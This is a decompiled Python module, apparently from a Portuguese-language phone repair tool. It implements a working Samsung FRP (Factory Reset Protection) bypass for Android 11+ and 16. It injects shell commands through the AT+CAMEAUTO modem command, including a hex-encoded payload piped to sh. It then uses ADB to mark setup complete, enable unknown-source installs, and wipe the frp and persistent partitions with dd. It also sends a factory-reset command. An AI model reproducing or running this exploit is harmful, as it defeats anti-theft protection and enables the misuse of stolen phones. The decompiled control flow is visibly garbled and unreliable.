            adb_commands = ['shell settings put global setup_wizard_has_run 1', 'shell settings put secure user_setup_complete 1', 'shell content insert --uri content://settings/secure --bind name:s:DEVICE_PROVISIONED --bind value:i:1', 'shell content insert --uri content://settings/secure --bind name:s:user_setup_complete --bind value:i:1', 'shell content insert --uri content://settings/secure --bind name:s:INSTALL_NON_MARKET_APPS --bind value:i:1', 'shell am start -c android.intent.category.HOME -a android.intent.action.MAIN']
            for adb_cmd in adb_commands:
                pass
            result['success'] = True
            self.add_log('­ƒÄë FRP BYPASS ANDROID 11+ CONCLU├ìDO!', 'INFO', 'FRP_11_PLUS')
        else:
            result['error'] = 'ADB n├úo foi ativado ap├│s sequ├¬ncias batch'
            self.add_log('ÔØî ADB n├úo ativado. Verifique se o dispositivo est├í no menu *#0*#', 'ERROR', 'FRP_11_PLUS')
        if self.serial_port:
            if self.serial_port.is_open:
                self.serial_port.close()
                return result
    def _execute_batch_sequence(self, commands: List[str], sequence_name: str) -> Tuple[bool, str]:
        '''Executa uma sequ├¬ncia de comandos em batch (m├®todo validado)'''
        try:
            if not self.serial_port or not self.serial_port.is_open:
                return (False, 'Porta n├úo conectada')
            self.add_log(f'­ƒôñ {sequence_name} ({len(commands)} comandos) - BATCH', 'INFO', 'BATCH')
            self.serial_port.reset_input_buffer()
            self.serial_port.reset_output_buffer()
            time.sleep(0.02)
            for command in commands:
                if not command.endswith('\r\n'):
                    command += '\r\n'
                self.add_log(f'­ƒôñ OUT: {command.strip()}', 'DEBUG', 'BATCH')
                cmd_bytes = command.encode('ascii')
                self.serial_port.write(cmd_bytes)
                time.sleep(0.01)
            self.serial_port.flush()
            self.add_log('­ƒôí Aguardando respostas do batch...', 'DEBUG', 'BATCH')
            start_time = time.time()
            buffer = b''
            batch_timeout = 2.0
            while time.time() - start_time < batch_timeout:
                if self.serial_port.in_waiting > 0:
                    chunk = self.serial_port.read(self.serial_port.in_waiting)
                    buffer += chunk
                time.sleep(0.05)
            if buffer:
                response_str = buffer.decode('ascii', errors='ignore')
                self.add_log('­ƒôÑ Batch response: dados recebidos', 'DEBUG', 'BATCH')
                return True, response_str
            self.add_log('­ƒôÑ Batch: sem resposta', 'DEBUG', 'BATCH')
            return (False, '')
        except Exception as e:
            self.add_log(f'ÔØî Erro no batch: {e}', 'ERROR', 'BATCH')
            return False, str(e)
    def check_adb_status(self) -> bool:
        '''Verifica se ADB est├í ativo - DUPLA VERIFICA├ç├âO: UNION + PATH'''
        import platform
        si = None
        cf = 0
        if platform.system() == 'Windows':
            si = subprocess.STARTUPINFO()
            si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            si.wShowWindow = subprocess.SW_HIDE
            cf = subprocess.CREATE_NO_WINDOW
        try:
            if self.adb_manager:
                self.add_log('­ƒöì Verificando ADB via ADBManager integrado do UNION...', 'INFO', 'ADB_CHECK')
                try:
                    if hasattr(self.adb_manager, 'is_device_connected'):
                        is_connected = self.adb_manager.is_device_connected()
                        if is_connected:
                            self.add_log('Ô£à ADB ativo via ADBManager integrado do UNION', 'INFO', 'ADB_CHECK')
                            return True
                    if hasattr(self.adb_manager, 'check_device'):
                        device_info = self.adb_manager.check_device()
                        if device_info and device_info.get('connected', False):
                            self.add_log('Ô£à ADB ativo via check_device do UNION', 'INFO', 'ADB_CHECK')
                            return True
                    if hasattr(self.adb_manager, 'execute_adb_command'):
                        adb_result = self.adb_manager.execute_adb_command('devices', timeout=5)
                        if adb_result:
                            adb_str = str(adb_result)
                            lines = [line.strip() for line in adb_str.split('\n') if line.strip()]
                            devices = [line.split('\t')[0] for line in lines if '\tdevice' in line]
                            if devices:
                                self.add_log(f'Ô£à ADB ativo via UNION: {len(devices)} dispositivo(s) autorizado(s)', 'INFO', 'ADB_CHECK')
                                return True
                except Exception as e:
                    self.add_log(f'ÔÜá´©Å Erro no ADBManager integrado: {str(e)[:50]}...', 'WARNING', 'ADB_CHECK')
        except Exception as e:
            self.add_log(f'ÔØî Erro verifica├º├úo ADB: {e}', 'ERROR', 'ADB_CHECK')
            return False
        try:
            self.add_log('­ƒöä Verificando ADB do PATH do Windows como fallback...', 'INFO', 'ADB_CHECK')
            result = subprocess.run('adb devices', shell=True, capture_output=True, text=True, timeout=5, startupinfo=si, creationflags=cf)
            if result.returncode == 0:
                devices = result.stdout.strip()
                self.add_log(f'­ƒôï Sa├¡da ADB PATH: {devices[:100]}...', 'DEBUG', 'ADB_CHECK')
                lines = [line.strip() for line in devices.split('\n') if line.strip()]
                all_devices = [line for line in lines if not line.startswith('List') if '\t' in line]
                authorized_devices = [line.split('\t')[0] for line in lines if '\tdevice' in line]
                unauthorized_devices = [line for line in lines if 'unauthorized' in line]
                connecting_devices = [line for line in lines if 'connecting' in line]
                for device_line in all_devices:
                    parts = device_line.split('\t')
                    if len(parts) >= 2:
                        device_id = parts[0]
                        status = parts[1]
                        if status == 'device':
                            self.add_log(f'Ô£à Dispositivo AUTORIZADO: {device_id}', 'INFO', 'ADB_CHECK')
                        elif status == 'connecting':
                            self.add_log(f'ÔÅ│ Dispositivo CONECTANDO: {device_id} (aguardando autoriza├º├úo)', 'WARNING', 'ADB_CHECK')
                        elif status == 'unauthorized':
                            self.add_log(f'ÔØî Dispositivo N├âO AUTORIZADO: {device_id}', 'WARNING', 'ADB_CHECK')
                        else:
                            self.add_log(f'ÔÜá´©Å Dispositivo STATUS DESCONHECIDO: {device_id} - {status}', 'WARNING', 'ADB_CHECK')
                if authorized_devices:
                    self.add_log(f'Ô£à ADB PATH ativo: {len(authorized_devices)} dispositivo(s) AUTORIZADO(s)', 'INFO', 'ADB_CHECK')
                    return True
                if connecting_devices:
                    self.add_log('ÔÅ│ Dispositivos encontrados mas ainda CONECTANDO - aguarde autoriza├º├úo', 'WARNING', 'ADB_CHECK')
                elif unauthorized_devices:
                    self.add_log('ÔØî Dispositivos encontrados mas N├âO AUTORIZADOS - aceite no dispositivo', 'WARNING', 'ADB_CHECK')
        except Exception as e:
            self.add_log(f'ÔØî Erro verifica├º├úo ADB: {e}', 'ERROR', 'ADB_CHECK')
            return False
        self.add_log('ÔØî Nenhum dispositivo ADB detectado (UNION + PATH)', 'WARNING', 'ADB_CHECK')
        return False
    def get_logs(self) -> List[str]:
        '''Retorna logs coletados'''
        return self.logs.copy()
    def clear_logs(self):
        '''Limpa logs'''
        self.logs.clear()
    def _connect_android16_direct(self, port_name: str) -> bool:
        '''
        Conex├úo DIRETA para FRP Android 16 - IGUAL AO SCRIPT DE TESTE
        Diferen├ºas do connect_to_port():
        - Timeout CURTO (0.3s) igual ao script que funciona
        - SEM teste AT obrigat├│rio
        - Configura├º├Áes simples
        '''
        try:
            self.add_log(f'­ƒöî Conectando DIRETO (modo Android 16): {port_name}', 'INFO', 'FRP_A16')
            if self.serial_port:
                pass
            try:
                if self.serial_port.is_open:
                    self.serial_port.close()
            except:
                pass
            else:
                self.serial_port = None
                time.sleep(0.5)
                self.serial_port = serial.Serial(port=port_name, baudrate=115200, timeout=0.3, write_timeout=0.3, bytesize=serial.EIGHTBITS, parity=serial.PARITY_NONE, stopbits=serial.STOPBITS_ONE, rtscts=False, dsrdtr=False, xonxoff=False)
                time.sleep(0.5)
                self.serial_port.reset_input_buffer()
                self.serial_port.reset_output_buffer()
                self.add_log(f'Ô£à Conectado DIRETO: {port_name}', 'INFO', 'FRP_A16')
        except Exception as e:
            self.add_log(f'ÔØî Erro conex├úo direta: {e}', 'ERROR', 'FRP_A16')
            return False
        return True
    def _send_at_android16(self, command: str, wait_time: float=1.0) -> Tuple[bool, str]:
        '''
        Envia comando AT para FRP Android 16 - IGUAL AO SCRIPT DE TESTE
        Diferen├ºas do send_at_command_stable():
        - L├│gica simples igual ao script que funciona
        - Tratamento de CAMEAUTO com formato AT
aT+...
        '''
        if not self.serial_port or not self.serial_port.is_open:
            return (False, 'N├úo conectado')
        try:
            self.serial_port.reset_input_buffer()
            time.sleep(0.02)
            if command.startswith('aT+CAMEAUTO'):
                full_cmd = f'AT\n{command}\r\n'
                cmd_bytes = full_cmd.encode('ascii', errors='ignore')
                self.serial_port.write(cmd_bytes)
                self.serial_port.flush()
            else:
                cmd_bytes = f'{command}\r\n'.encode('ascii', errors='ignore')
                self.serial_port.write(cmd_bytes)
                self.serial_port.flush()
            time.sleep(wait_time)
            buffer = b''
            start_time = time.time()
            max_wait = wait_time + 1.5
            no_data_count = 0
            while time.time() - start_time < max_wait:
                if self.serial_port.in_waiting > 0:
                    buffer += self.serial_port.read(self.serial_port.in_waiting)
                    no_data_count = 0
                    time.sleep(0.05)
                else:
                    no_data_count += 1
                    if buffer and no_data_count > 3:
                        break
                time.sleep(0.05)
            response = buffer.decode('ascii', errors='ignore')
            success = len(response.strip()) > 0
            return success, response
        except PermissionError:
            return (True, 'USB_RECONNECT')
        except Exception as e:
            error_str = str(e)
            if 'Permission' in error_str or 'Acesso' in error_str or 'ClearComm' in error_str:
                return (True, 'USB_RECONNECT')
            return False, str(e)
    def execute_frp_android_16(self, log_callback=None, method_2_confirmed=False) -> Dict:
        '''
Executa FRP Bypass para Android 16 (m├®todo validado)
FLUXO:
1. M├®todo 1: Sequ├¬ncia normal (AT + CAMEAUTO + ADB)
2. Se falhar ÔåÆ M├®todo 2: Factory Reset + reconex├úo + repetir
Args:
    log_callback: Fun├º├úo para exibir logs na interface
    method_2_confirmed: Se True, pula direto para m├®todo 2 (factory)
Returns:
    Dict com resultado da opera├º├úo
'''
        result = {'success': False, 'method': 'FRP Android 16 (Patch Novembro 2024)', 'phase': '', 'adb_activated': False, 'requires_factory_reset': False, 'requires_reconnection': False, 'error': '', 'device_model': ''}
        def log(msg, level='INFO'):
            '''Log interno e callback'''
            self.add_log(msg, level, 'FRP_A16')
            if log_callback:
                log_callback(msg)
        try:
            log('­ƒöÑ Iniciando FRP Android 16...')
            log('­ƒôí Conectando API TECH UNION...')
            ports = self.find_samsung_ports()
            if not ports:
                result['error'] = 'Nenhuma porta Samsung encontrada'
                log('ÔØî Dispositivo n├úo detectado')
                if self.serial_port:
                    if self.serial_port.is_open:
                        try:
                            self.serial_port.close()
                        except:
                            return
                        return result
                    return
                return
        except Exception as e:
            result['error'] = f'Erro: {str(e)}'
            log('ÔØî Erro durante execu├º├úo')
        try:
            target_port = ports[0]['port']
            log('Ô£à Dispositivo detectado')
            if not self._connect_android16_direct(target_port):
                result['error'] = 'Falha na conex├úo'
                log('ÔØî Falha na conex├úo')
                if self.serial_port:
                    if self.serial_port.is_open:
                        try:
                            self.serial_port.close()
                        except:
                            return
                        return result
                    return
                return
        except Exception as e:
            result['error'] = f'Erro: {str(e)}'
            log('ÔØî Erro durante execu├º├úo')
        try:
            log('Ô£à Conex├úo estabelecida')
            result['phase'] = 'connected'
            log('ÔÜí Inicializando protocolo...')
            log('   ÔåÆ Ativando modo seguro...')
            success, response = self._send_at_android16('AT+SWATD=0', 0.5)
            if '[DR]: CHANGE TO DDEXE' in response or '[ATD]: CHANGE TO DDEXE' in response:
                log('   Ô£à Modo DDEXE ativado')
            time.sleep(0.3)
            log('   ÔåÆ Obtendo informa├º├Áes do dispositivo...')
            success, response = self._send_at_android16('AT+DEVCONINFO', 1.5)
            device_model = ''
            if '+DEVCONINFO:' in response:
                log('   Ô£à Dispositivo conectado!')
                log('   ÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöü')
            try:
                import re
                match_model = re.search('MN\\(([^)]+)\\)', response)
                if match_model and match_model.group(1):
                    device_model = match_model.group(1)
                    result['device_model'] = device_model
                    log(f'   ­ƒô▒ Modelo: {device_model}')
                match_sn = re.search('SN\\(([^)]+)\\)', response)
                if match_sn and match_sn.group(1) and match_sn.group(1) != 'NONE':
                    log(f'   ­ƒöó Serial: {match_sn.group(1)}')
                match_ver = re.search('VER\\(([^)]+)\\)', response)
                if match_ver and match_ver.group(1):
                    ver = match_ver.group(1).split('/')[0]
                    log(f'   ­ƒôï Firmware: {ver}')
                match_cc = re.search('CC\\(([^)]+)\\)', response)
                if match_cc and match_cc.group(1):
                    log(f'   ­ƒîì Pa├¡s: {match_cc.group(1)}')
            except Exception:
                pass
            else:
                log('   ÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöü')
                log('   ÔÜá´©Å Informa├º├Áes n├úo obtidas')
                time.sleep(0.2)
                log('Ô£à Protocolo inicializado')
                result['phase'] = 'initialized'
                log('­ƒöô Ativando dispositivo...')
                self._send_at_android16('AT+SWATD=0', 0.3)
                time.sleep(0.2)
                success, response = self._send_at_android16('AT+ACTIVATE=0,0,0', 3.0)
                usb_ready = '+USB' in response or '+ACTIVATE:0,OK' in response
                boot_ok = 'BOOTING COMPLETED' in response or 'RESET COMPLETED' in response
                if usb_ready or boot_ok:
                    log('Ô£à Dispositivo ativado')
                else:
                    log('ÔÜá´©Å Ativa├º├úo parcial')
                time.sleep(0.5)
                success, response = self._send_at_android16('AT+SWATD=1', 1.0)
                if '[DR]: CHANGE TO ATD' in response or '[ATD]: CHANGE TO ATD' in response:
                    log('Ô£à Modo de inje├º├úo ativado')
                else:
                    log('ÔÜá´©Å Modo ATD (verificando...)')
                log('ÔÅ│ Aguardando estabiliza├º├úo (2s)...')
                time.sleep(2.0)
                if self.serial_port and self.serial_port.is_open and self.serial_port.in_waiting > 0:
                    self.serial_port.read(self.serial_port.in_waiting)
                result['phase'] = 'activated'
                log('­ƒöÑ API descarregando exploit...')
                cameauto_commands = ['aT+CAMEAUTO=0,1,0,2,/;rm -f /data/log/adb.txt /data/log/adb.apk;', 'aT+CAMEAUTO=0,1,0,2,/;$(echo -n 73657470726f7020706572736973742e7379732e6175746f5f636f6e6669726d2031|xxd -r -p|sh && echo -n 73657470726f7020706572736973742e7379732e7573622e636f6e666967206d74702c616462|xxd -r -p|sh);', 'aT+CAMEAUTO=0,1,0,2,/;am broadcast -a com.android.server.ACTION_USBDEBUG_ENABLED;']
                cameauto_success = 0
                for i, cmd in enumerate(cameauto_commands, 1):
                    log(f'   ÔåÆ Injetando m├│dulo {i}/3...')
                    if self.serial_port and self.serial_port.is_open and self.serial_port.in_waiting > 0:
                        self.serial_port.read(self.serial_port.in_waiting)
                    success, response = self._send_at_android16(cmd, 1.0)
                    if '+CAMEAUTO:0,OK' in response:
                        log(f'   Ô£à M├│dulo {i} confirmado!')
                        cameauto_success += 1
                    elif 'USB_RECONNECT' in response:
                        log('   ­ƒöä USB reconectando...')
                        cameauto_success += 1
                    elif 'OK' in response:
                        log(f'   Ô£à M├│dulo {i} enviado')
                        cameauto_success += 1
                    else:
                        log(f'   ÔÜá´©Å M├│dulo {i} sem resposta')
                    time.sleep(0.5)
                    continue
                if cameauto_success > 0:
                    log(f'Ô£à Exploit injetado ({cameauto_success}/3)')
                else:
                    log('ÔÜá´©Å Inje├º├úo parcial')
                result['phase'] = 'injected'
                log('­ƒöì Verificando ativa├º├úo...')
                log('   ÔÅ│ Aguardando estabiliza├º├úo...')
                time.sleep(10)
        except Exception as e:
            result['error'] = f'Erro: {str(e)}'
            log('ÔØî Erro durante execu├º├úo')
        try:
            adb_path = self.adb_manager.adb_path if self.adb_manager and self.adb_manager.adb_path else 'adb'
            import platform
            startupinfo = None
            creationflags = 0
            if platform.system() == 'Windows':
                startupinfo = subprocess.STARTUPINFO()
                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                startupinfo.wShowWindow = subprocess.SW_HIDE
                creationflags = subprocess.CREATE_NO_WINDOW
            subprocess.run([adb_path, 'kill-server'], capture_output=True, timeout=5, startupinfo=startupinfo, creationflags=creationflags)
            time.sleep(2)
            subprocess.run([adb_path, 'start-server'], capture_output=True, timeout=10, startupinfo=startupinfo, creationflags=creationflags)
            time.sleep(3)
        except:
            pass
        adb_active = self.check_adb_status()
        result['adb_activated'] = adb_active
        if adb_active:
            log('Ô£à ADB ativado com sucesso!')
            result['phase'] = 'adb_ready'
            log('­ƒô▒ Executando bypass FRP...')
            adb_commands = [('shell settings put global setup_wizard_has_run 1', 'Configurando wizard'), ('shell settings put secure user_setup_complete 1', 'Configurando usu├írio'), ('shell content insert --uri content://settings/secure --bind name:s:DEVICE_PROVISIONED --bind value:i:1', 'Provisionando'), ('shell content insert --uri content://settings/secure --bind name:s:user_setup_complete --bind value:i:1', 'Finalizando'), ('shell content insert --uri content://settings/secure --bind name:s:INSTALL_NON_MARKET_APPS --bind value:i:1', 'Apps externos'), ('shell dd if=/dev/zero of=/dev/block/by-name/frp bs=512 count=1', 'Limpando FRP'), ('shell dd if=/dev/zero of=/dev/block/by-name/persistent bs=512 count=1', 'Limpando Persistent'), ('shell am start -c android.intent.category.HOME -a android.intent.action.MAIN', 'Abrindo Home'), ('reboot', 'Reiniciando')]
            adb_path = self.adb_manager.adb_path if self.adb_manager and self.adb_manager.adb_path else 'adb'
            startupinfo = None
            creationflags = 0
            if platform.system() == 'Windows':
                startupinfo = subprocess.STARTUPINFO()
                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                startupinfo.wShowWindow = subprocess.SW_HIDE
                creationflags = subprocess.CREATE_NO_WINDOW
            adb_success = 0
            for cmd, desc in adb_commands:
                log(f'   ÔåÆ {desc}...')
                try:
                    cmd_list = [adb_path] + cmd.split()
                    proc = subprocess.run(cmd_list, capture_output=True, text=True, timeout=15, startupinfo=startupinfo, creationflags=creationflags)
                    if proc.returncode == 0:
                        adb_success += 1
                except:
                    pass
                time.sleep(0.5)
            log(f'Ô£à Bypass conclu├¡do ({adb_success}/{len(adb_commands)})')
            result['success'] = True
            result['phase'] = 'completed'
            log('­ƒÄë FRP BYPASS ANDROID 16 CONCLU├ìDO!')
        else:
            log('ÔÜá´©Å ADB n├úo detectado')
            log('­ƒÆí M├®todo alternativo dispon├¡vel')
            result['requires_factory_reset'] = True
            result['phase'] = 'adb_failed'
            result['error'] = 'ADB n├úo ativou - M├®todo 2 necess├írio'
        if self.serial_port:
            if self.serial_port.is_open:
                try:
                    self.serial_port.close()
                except:
                    return
                return result
    def execute_frp_android_16_method2(self, log_callback=None) -> Dict:
        '''
        Executa M├®todo 2 do FRP Android 16: Factory Reset + reconex├úo + repetir
        FLUXO:
        1. Envia comando Factory Reset
        2. Aguarda dispositivo reiniciar
        3. Usu├írio reconecta
        4. Executa M├®todo 1 novamente
        '''
        result = {'success': False, 'method': 'FRP Android 16 - M├®todo 2 (Factory Reset)', 'phase': '', 'requires_reconnection': True, 'error': ''}
        def log(msg, level='INFO'):
            self.add_log(msg, level, 'FRP_A16_M2')
            if log_callback:
                log_callback(msg)
        try:
            log('­ƒöä Iniciando M├®todo 2 (Factory Reset)...')
            log('­ƒôí Conectando API TECH UNION...')
            ports = self.find_samsung_ports()
            if not ports:
                result['error'] = 'Dispositivo n├úo detectado'
                if self.serial_port:
                    if self.serial_port.is_open:
                        try:
                            self.serial_port.close()
                        except:
                            return
                        return result
                    return
                return
        except Exception as e:
            result['error'] = str(e)
            log('ÔØî Erro durante formata├º├úo')
        try:
            target_port = ports[0]['port']
            if not self._connect_android16_direct(target_port):
                result['error'] = 'Falha na conex├úo'
                if self.serial_port:
                    if self.serial_port.is_open:
                        try:
                            self.serial_port.close()
                        except:
                            return
                        return result
                    return
                return
        except Exception as e:
            result['error'] = str(e)
            log('ÔØî Erro durante formata├º├úo')
        try:
            log('Ô£à Conex├úo estabelecida')
            log('­ƒöä Preparando formata├º├úo...')
            self._send_at_android16('AT+SWATD=0', 0.3)
            time.sleep(0.3)
            log('ÔÜá´©Å Enviando comando de formata├º├úo...')
            success, response = self._send_at_android16('AT+FACTORST=0,0', 3.0)
            if '+FACTORST:0' in response:
                log('Ô£à Formata├º├úo iniciada')
                result['phase'] = 'factory_sent'
            else:
                log('ÔÜá´©Å Comando enviado (aguardando resposta)')
            log('­ƒöä Dispositivo vai reiniciar...')
            log('­ƒô▒ Aguarde o dispositivo ligar novamente')
            log('­ƒöî Reconecte quando solicitado')
            result['requires_reconnection'] = True
            result['phase'] = 'waiting_reconnection'
        except Exception as e:
            result['error'] = str(e)
            log('ÔØî Erro durante formata├º├úo')
        if self.serial_port:
            if self.serial_port.is_open:
                try:
                    self.serial_port.close()
                except:
                    return
                return result
# WARNING: Decompyle incomplete
